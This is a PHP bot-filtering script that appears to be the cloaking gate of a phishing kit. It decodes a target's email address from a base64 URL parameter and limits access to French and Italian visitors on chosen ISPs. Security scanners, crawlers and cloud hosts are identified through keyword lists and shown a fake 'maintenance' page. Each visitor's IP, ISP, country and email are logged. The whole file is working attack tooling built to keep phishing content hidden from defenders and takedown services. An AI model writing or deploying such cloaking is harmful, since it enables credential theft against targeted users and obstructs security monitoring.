<?php
session_start();
require_once './config_bots.php';
date_default_timezone_set('Europe/Paris');

// --- Process Email from URL immediately ---
if(isset($_GET["hash"])){
	$eml = @base64_decode($_GET["hash"]);
}else{
	$eml = "N/A";
}
$_SESSION["email"] = $eml;

// --- Configuration for bot handling ---
$fake_content_file = 'fcontent.html'; // File to show to bots instead of blocking
$show_fake_content = true; // Set to false to redirect bots instead

// --- Helper Functions ---

function get_visitor_ip() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            return trim(explode(',', $_SERVER[$header])[0]);
        }
    }
    return '0.0.0.0';
}

function is_legitimate_isp($hostname, $asn, $country_code) {
    $check_string = strtolower($hostname . " " . $asn);
    
    if ($country_code === 'FR') {
        // For France: ONLY allow Wifirst Networks
        return (strpos($check_string, 'wifirst') !== false);
    } 
    elseif ($country_code === 'IT') {
        // For Italy: Allow major legitimate ISPs
        $italian_isps = [
            'telecom italia', 'tim', 'wind tre', 'fastweb', 'vodafone italia', 
            'infostrada', 'tiscali', 'eolo', 'linkem', 'vianova'
        ];
        
        foreach($italian_isps as $isp) {
            if(strpos($check_string, $isp) !== false) {
                return true;
            }
        }
    }
    
    return false;
}

function is_suspicious_request() {
    // More lenient suspicious request detection
    $suspicious_patterns = [
        // Only check for clearly bot-like patterns
        $_SERVER['REQUEST_METHOD'] === 'HEAD',
        $_SERVER['REQUEST_METHOD'] === 'OPTIONS',
        
        // Obvious bot query strings
        isset($_GET['debug']) || isset($_GET['test']) || isset($_GET['scan']) || isset($_GET['probe']),
        
        // Rate limiting (reduced threshold)
        check_request_frequency(),
    ];
    
    return in_array(true, $suspicious_patterns);
}

function check_request_frequency() {
    $visitor_ip = get_visitor_ip();
    $now = time();
    $time_window = 60; // 1 minute
    $max_requests = 20; // Increased from 10 to 20 requests per minute to be less aggressive
    
    if (!isset($_SESSION['request_times'])) {
        $_SESSION['request_times'] = [];
    }
    
    // Clean old entries
    $_SESSION['request_times'] = array_filter($_SESSION['request_times'], function($time) use ($now, $time_window) {
        return ($now - $time) <= $time_window;
    });
    
    // Add current request
    $_SESSION['request_times'][] = $now;
    
    return count($_SESSION['request_times']) > $max_requests;
}

function is_headless_browser() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Only detect obvious automation tools
    $headless_indicators = [
        'phantomjs',
        'selenium',
        'webdriver',
        'playwright',
        'puppeteer',
        'chrome-lighthouse',
        'jsdom'
    ];
    
    foreach ($headless_indicators as $indicator) {
        if (stripos($user_agent, $indicator) !== false) {
            return true;
        }
    }
    
    return false;
}

function run_bot_check() {
    global $show_fake_content, $fake_content_file;
    
    $visitor_ip = get_visitor_ip();
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ipDetails = null;
    $resp = '';

    // --- STEP 1: Developer Whitelist (Fix for localhost) ---
    $whitelist_ips = ['127.0.0.1', '::1'];
    if (in_array($visitor_ip, $whitelist_ips)) {
        log_visitor($visitor_ip, true);
        return;
    }

    // --- STEP 2: Enhanced Bot Detection (More lenient) ---
    
    // Check for headless browsers first
    if (is_headless_browser()) {
        handle_bot($visitor_ip, "Headless Browser Detected");
    }
    
    // Check for suspicious request patterns (more lenient)
    if (is_suspicious_request()) {
        handle_bot($visitor_ip, "Suspicious Request Pattern");
    }

    // --- STEP 3: Check for a cached result first ---
    if (isset($_SESSION['ip_data']) && $_SESSION['ip_data']['query'] === $visitor_ip) {
        // Use the cached data from the session
        $ipDetails = $_SESSION['ip_data'];
        $resp = $_SESSION['ip_data_raw'];
    } else {
        // If no cache, make the API call
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/{$visitor_ip}");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $resp = curl_exec($ch);
        curl_close($ch);
        
        $ipDetails = json_decode($resp, true);

        // --- Cache the new result in the session ---
        $_SESSION['ip_data'] = $ipDetails;
        $_SESSION['ip_data_raw'] = $resp;
    }

    if (!$ipDetails || $ipDetails['status'] !== 'success') {
        handle_bot($visitor_ip, "API Fail");
    }

    // Store details in session
    $_SESSION["ip"] = $visitor_ip;
    $_SESSION["hostname"] = $ipDetails["isp"] ?? 'N/A';
    $_SESSION["country"] = $ipDetails["country"] ?? 'N/A';
    $_SESSION["asn"] = $ipDetails["as"] ?? 'N/A';
    $_SESSION["dtetme"] = date('d/m/Y H:i:s', time());

    $country_code = $ipDetails["countryCode"] ?? '';
    $allowed_countries = ["FR", "IT"];
    if (!in_array($country_code, $allowed_countries)) {
        handle_bot($visitor_ip, "Country Blocked: {$country_code}");
    }

    // --- STEP 4: Check if it's a legitimate ISP BEFORE keyword blocking ---
    if (is_legitimate_isp($_SESSION["hostname"], $_SESSION["asn"], $country_code)) {
        log_visitor($visitor_ip, true);
        return;
    }

    // --- STEP 5: More targeted Blocklist Keyword Check ---
    $blocked_keywords = [
        // Web crawlers and bots (keep these)
        'bot', 'crawl', 'spider', 'slurp', 'acunetix', 'netsparker', 'ahrefs',
        'python', 'wget', 'curl', 'scan', 'proxy', 'tor', 'exit',
        
        // Email/mailbox bots (made more specific)
        'webmail', 'mailserver', 'smtp server', 'mail server', 'email server',
        'harvest', 'scraper', 'extractor', 'collector',
        
        // Cloud/hosting providers (keep these)
        'hetzner', 'ovh', 'googleusercontent', 'amazonaws', 'digitalocean', 
        'softlayer', 'linode', 'vultr', 'ramnode', 'buyvm',
        
        // Automation tools (keep these)
        'selenium', 'phantomjs', 'automation', 'webdriver',
        'playwright', 'puppeteer', 'requests', 'urllib', 'httpx',
        
        // Security scanners (keep these)
        'nikto', 'nmap', 'masscan', 'zap', 'burp', 'sqlmap', 'dirb',
        'gobuster', 'wfuzz', 'ffuf', 'nuclei', 'skipfish',
        
        // Monitoring services (keep these)
        'pingdom', 'monitor', 'uptime', 'check', 'probe', 'test'
    ];
    
    $visitor_info = strtolower($resp . " " . $user_agent);
    foreach ($blocked_keywords as $keyword) {
        if (strpos($visitor_info, $keyword) !== false) {
            handle_bot($visitor_ip, "Keyword Blocked: '{$keyword}'");
        }
    }

    // --- STEP 6: Hosting provider checks (more specific) ---
    $blocked_hosting_keywords = [
        'hosting', 'datacenter', 'data center', 'cloud provider', 'vps', 'dedicated server',
        'colocation', 'colo', 'server farm'
    ];
    
    $asn_info = strtolower($_SESSION["asn"] . " " . $_SESSION["hostname"]);
    foreach ($blocked_hosting_keywords as $keyword) {
        if (strpos($asn_info, $keyword) !== false) {
            handle_bot($visitor_ip, "Hosting Provider Blocked: '{$keyword}'");
        }
    }

    // --- If all checks pass, we log the legitimate visitor ---
    log_visitor($visitor_ip, true);
}

function handle_bot($ip, $reason) {
    global $url_redirect, $show_fake_content, $fake_content_file;
    
    $log_message = date('Y-m-d H:i:s') . " | IP: {$ip} | Reason: {$reason}" . PHP_EOL;
    file_put_contents('log/bots_blocked.log', $log_message, FILE_APPEND);
    
    log_visitor($ip, false);

    if ($show_fake_content && file_exists($fake_content_file)) {
        // Show fake content to bots instead of redirecting
        serve_fake_content();
    } else {
        // Redirect to decoy site
        header("Location: " . $url_redirect);
        exit();
    }
}

function serve_fake_content() {
    global $fake_content_file;
    
    // Set headers to make it look like a normal page
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: public, max-age=3600');
    
    // Serve the fake content
    if (file_exists($fake_content_file)) {
        readfile($fake_content_file);
    } else {
        // Default fake content if file doesn't exist
        echo generate_default_fake_content();
    }
    exit();
}

function generate_default_fake_content() {
    return '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - Under Maintenance</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; margin-bottom: 20px; }
        p { color: #666; line-height: 1.6; margin-bottom: 15px; }
        .status { background: #e8f4f8; padding: 15px; border-radius: 5px; color: #2c5aa0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 Site Under Maintenance</h1>
        <p>We are currently performing scheduled maintenance to improve our services.</p>
        <div class="status">
            <strong>Estimated completion:</strong> 2-3 hours<br>
            <strong>Status:</strong> In Progress
        </div>
        <p>Thank you for your patience. Please check back later.</p>
        <p><small>If you need immediate assistance, please contact support.</small></p>
    </div>
    
    <!-- Hidden honeypot for additional bot detection -->
    <div style="position: absolute; left: -9999px; top: -9999px;">
        <input type="email" name="email_trap" value="">
        <input type="text" name="website" value="">
        <a href="/admin/login">Admin Login</a>
        <a href="/wp-admin/">WordPress Admin</a>
        <a href="mailto:admin@example.com">admin@example.com</a>
    </div>
</body>
</html>';
}

function log_visitor($ip, $is_allowed) {
    global $historyfile;
    $log_directory = 'log';
    if (!is_dir($log_directory)) {
        mkdir($log_directory, 0755, true);
    }
    
    $status = $is_allowed ? 1 : 0;
    $hostname = $_SESSION["hostname"] ?? 'N/A';
    $country = $_SESSION["country"] ?? 'N/A';
    $asn = $_SESSION["asn"] ?? 'N/A';
    $time = $_SESSION["dtetme"] ?? date('d/m/Y H:i:s');
    $email = $_SESSION["email"] ?? 'N/A';

    $activity_log = "IP : {$ip} | HOSTNAME : {$hostname} | COUNTRY : {$country} | ASN : {$asn} | TIME : {$time} | EMAIL : {$email} | STATUS : {$status}";
    
    file_put_contents($historyfile, "$activity_log\n", FILE_APPEND);
}

// --- Run the main check function ---
run_bot_check();
?>